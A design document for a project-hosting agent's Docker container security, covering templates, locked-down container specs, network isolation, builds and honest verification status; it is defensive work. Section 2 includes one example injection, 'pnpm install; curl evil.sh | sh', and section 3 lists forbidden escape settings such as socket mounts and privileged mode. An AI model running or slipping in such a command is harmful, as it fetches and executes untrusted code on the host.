# Docker Model and Container Security

Every project runs in its own container. The agent is the only component that
speaks to Docker, and it does so through the Docker **HTTP API** via `bollard` —
never by invoking the `docker` CLI. That single decision removes command
injection from this layer entirely: there is no command line to inject into.

---

## 1. The security problem, stated plainly

Access to the Docker socket is equivalent to root on the host. A container that
can reach it can mount the host filesystem and rewrite anything. Therefore the
socket is never mounted into a project container, the API is never proxied to
one, and no route exists by which a project can ask the agent to perform an
arbitrary Docker operation on its behalf.

The agent itself must have that access to function. It is the trusted component;
its protection is that it runs no user-supplied code in-process and accepts only
validated, typed operations.

---

## 2. Approved templates only

Version one has exactly three runtime templates. There is no free-form image
field, no user-supplied Dockerfile, and no registry pull of an arbitrary
reference.

```
docker/templates/
  nodejs/       Dockerfile.hbs, manifest.toml, README.md
  python/       Dockerfile.hbs, manifest.toml, README.md
  static-site/  Dockerfile.hbs, manifest.toml, README.md
```

`manifest.toml` declares what the template permits — supported runtime versions,
allowed package managers, default and permitted commands, exposed port,
health-check shape. The agent validates every project's runtime configuration
against the manifest before rendering. A version or command outside the manifest
is rejected at the API boundary.

Rendering uses a strict template engine with **no shell interpolation**: values
land in JSON-array form (`CMD ["node", "index.js"]`), not in a string that a
shell would parse. Base images are pinned by digest, not by tag, so `node:22`
being republished cannot silently change what runs.

```
FROM node:22.14.0-bookworm-slim@sha256:…
```

An `install_command` is not free text. It is a choice among manifest-declared
options with validated arguments — the difference between selecting
`pnpm install --frozen-lockfile` from a list and being able to type
`pnpm install; curl evil.sh | sh`.

---

## 3. Container specification

Built as a typed Rust struct, never a string. Every project container is created
with all of the following; none is optional.

```rust
ContainerSpec {
    name:        "ph_<slug>",              // from UUID, never user text
    image:       "projecthost/<template>:<project-id>",
    labels: {
        "io.projecthost.managed":    "true",
        "io.projecthost.project-id": "<uuid>",
        "io.projecthost.template":   "nodejs",
        "io.projecthost.version":    "<agent version>",
    },
    user:            "10001:10001",        // non-root, per-container
    read_only_root:  true,
    tmpfs:           ["/tmp:rw,noexec,nosuid,size=64m"],
    mounts:          [ project_dir → /app (rw),  data_volume → /data (rw) ],
    network:         "ph_net_<slug>",      // dedicated
    memory_limit:    <mb> * 1024 * 1024,
    memory_swap:     same as memory_limit, // no swap escape from the limit
    cpu_quota:       <cores> * 100_000,
    pids_limit:      <process_limit>,
    restart_policy:  UnlessStopped | OnFailure | No,
    security_opt:    ["no-new-privileges:true"],
    cap_drop:        ["ALL"],
    cap_add:         [],                   // empty for all three templates
    privileged:      false,
    network_mode:    never "host",
    devices:         [],
    log_config:      json-file, max-size 10m, max-file 3,
    healthcheck:     from manifest, or none,
    stop_timeout:    10s,
}
```

`memory_swap` equal to `memory_limit` matters more than it looks: leaving it
unset lets a container use swap beyond its memory limit, quietly defeating the
limit the user configured.

### Forbidden, unconditionally

No code path constructs a container with any of these. There is no configuration
that enables them, and a unit test asserts each is absent from every generated
spec:

- Docker socket mount (`/var/run/docker.sock`, `\\.\pipe\docker_engine`)
- `privileged: true`
- `network_mode: host`
- `pid: host`, `ipc: host`, `uts: host`
- Device mappings
- Added capabilities, `SYS_ADMIN` in particular
- `security_opt` values that relax seccomp or AppArmor
- Bind mounts to any path outside that project's own directory
- Mounts of the agent's config, database, backup or log directories

---

## 4. Filesystem layout inside a container

| Mount           | Source                       | Mode            |
| --------------- | ---------------------------- | --------------- |
| `/app`          | `<projects_dir>/<uuid>/`     | read-write      |
| `/data`         | named volume `ph_vol_<slug>` | read-write      |
| `/tmp`          | tmpfs, 64 MB                 | `noexec,nosuid` |
| everything else | image layers                 | **read-only**   |

A read-only root with two writable mounts is the smallest arrangement that still
lets a normal application work. Dependencies install into `/app/node_modules` or
a virtualenv inside the image; nothing needs to write to `/usr` or `/etc`.

Bind-mount sources are canonical absolute paths verified to be beneath the
projects directory immediately before the create call — not at configuration
time, since the path could have been swapped in between.

---

## 5. Networking

One Docker bridge network per project, named `ph_net_<slug>`, carved from a
configurable pool (default `10.210.0.0/16`, `/28` per project). Projects cannot
reach each other: separate networks with no shared attachment, which is the
mechanism behind the cross-project isolation promise.

The four user-selectable modes:

| Mode       | Implementation                                                       |
| ---------- | -------------------------------------------------------------------- |
| `NONE`     | `network_mode: none`. No interface at all                            |
| `INTERNAL` | Dedicated network with `internal: true` — no outbound route          |
| `LAN`      | Dedicated network, port published to the host's private address only |
| `INTERNET` | Dedicated network with outbound routing                              |

Port publishing binds `127.0.0.1` by default. Binding to a LAN address is a
per-project choice requiring the LAN setting to be enabled globally, and it is
audited. Nothing binds `0.0.0.0` unless the user asks for it explicitly at both
levels.

Host ports come from a pool (default 20000–29999), allocated under a database
`UNIQUE` constraint so two projects cannot claim one, checked for actual
availability by binding before use, and released when a container is removed.
Ports below 1024 are rejected by schema, so privileged-port abuse is not
expressible.

---

## 6. Image build

1. Render the template's `Dockerfile.hbs` with validated values.
2. Write it to a UUID temp directory alongside a `.dockerignore`.
3. Build with the project directory as context, tagged
   `projecthost/<template>:<project-id>`.
4. Stream build output to the client and to a build-log file on disk.
5. On success, record the image tag on the deployment; on failure, mark the
   deployment `FAILED` with the captured error and clean up.

Build context is the project directory only. BuildKit is used where available
for cache mounts, which keeps package caches out of the final image while still
making rebuilds fast. Caches are per-project and clearable from the UI, which is
what the "clear package cache" requirement resolves to.

Builds are serialised across projects — a global semaphore — so a user starting
five rebuilds does not exhaust the host.

---

## 7. Runtimes

### Node.js

Detection reads and validates `package.json` (invalid JSON stops the deployment
with a clear error), then chooses a package manager from lockfile evidence:
`pnpm-lock.yaml` → pnpm, `yarn.lock` → yarn, `package-lock.json` → npm.
**Default is pnpm.**

```
pnpm install --frozen-lockfile
```

With no lockfile, the behaviour is defined rather than improvised: the agent
warns that the build is not reproducible, falls back to `pnpm install`, and
records the fallback on the deployment. It does not silently pretend a lockfile
existed.

Scripts are read from `package.json` and offered for selection. `dev`,
`watch` and `nodemon` scripts are flagged as development-mode and are not chosen
by default. A missing start script is a validation failure at creation time, not
a container that exits immediately with an obscure message. Only maintained LTS
versions are offered; an unsupported version is rejected with the supported list.

TypeScript is supported through a build step and a production output directory;
a multi-stage build keeps dev dependencies out of the runtime image.
Dependencies install inside the container, always — nothing is ever installed on
the host.

### Python

Detection order: `uv.lock` → uv, `poetry.lock` → poetry, `Pipfile.lock` →
pipenv, `pyproject.toml` → pip/uv, `requirements.txt` → pip. The entry file is
selected and validated to exist before the build. Both `python main.py` and
`python -m package` are supported. Dependency-installation failures surface with
the resolver's own message, which is usually the only useful diagnostic.

### Static sites

`index.html` detection; optional build command with a publish directory (so a
Vite build works); served by a pinned minimal nginx image running as non-root on
a high port. The local address and mapped port are shown in the UI.

---

## 8. Health checks

Manifest-declared shapes only: HTTP path, TCP port, or a command from the
template's allow-list. Docker runs the check; the agent watches health events
and reflects `HEALTHY` / `UNHEALTHY` in project status, raising a notification
on transition to unhealthy.

Not every workload has a meaningful check — a Discord bot serves nothing. For
those, health is `NONE` and liveness is judged by the process running and by
restart count, which is honest rather than inventing a check that always passes.

---

## 9. Lifecycle and reconciliation

The agent subscribes to Docker's event stream, filtered by the
`io.projecthost.managed` label, with a single listener that is re-established on
disconnect — never a second listener stacked on the first.

| Event           | Response                                                            |
| --------------- | ------------------------------------------------------------------- |
| `start`         | status `RUNNING`, record event, begin metrics                       |
| `die`           | record exit code; if unexpected, increment restart count, notify    |
| `oom`           | `OOM_KILLED` event, notification recommending a higher memory limit |
| `health_status` | update health, notify on transition                                 |
| `destroy`       | clear container id, stop metrics, detach log follower               |

On agent start, reconciliation compares every project's `desired_state` with
Docker reality and converges: start what should run, adopt what already runs,
mark missing containers for rebuild, release stale ports. Docker's
`unless-stopped` policy restores containers across a reboot; the reconciler
handles everything Docker cannot know about.

---

## 10. Docker unavailability

Docker being absent or stopped is a normal state, not a crash. The agent starts,
serves the API, reports `DOCKER_UNAVAILABLE` for container operations, and shows
a platform-specific install or start hint. Project files, backups, logs, settings
and the audit log all stay available. When Docker returns, the agent reconnects,
re-establishes the event stream, and reconciles.

---

## 11. Verification status

None of this can be executed on the current development machine — it has no
Docker and no WSL. Everything in this document is design plus statically
testable assertions.

| Item                                                   | Verifiable now | Needs Docker |
| ------------------------------------------------------ | -------------- | ------------ |
| Container spec generation (unit tests over the struct) | ✅             |              |
| "Forbidden flag never set" assertions                  | ✅             |              |
| Template rendering and manifest validation             | ✅             |              |
| Port allocation logic and constraints                  | ✅             |              |
| Actual image builds                                    |                | ✅           |
| Container start/stop/restart, limits enforced          |                | ✅           |
| Log streaming, stats, event handling                   |                | ✅           |
| Network isolation between projects                     |                | ✅           |
| Reboot recovery                                        |                | ✅           |

The left column is genuinely valuable — most container-security bugs are in
spec construction, and those are catchable here. But no claim that a container
_runs_ correctly will be made until it has run.
